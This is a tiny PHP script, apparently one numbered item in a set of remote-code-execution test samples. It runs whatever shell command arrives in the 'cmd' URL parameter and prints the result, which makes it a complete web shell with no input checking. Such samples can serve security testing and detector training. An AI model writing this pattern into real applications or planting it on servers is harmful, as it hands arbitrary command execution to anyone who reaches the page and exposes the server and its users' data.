<?php
// RCE test variation #1137
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>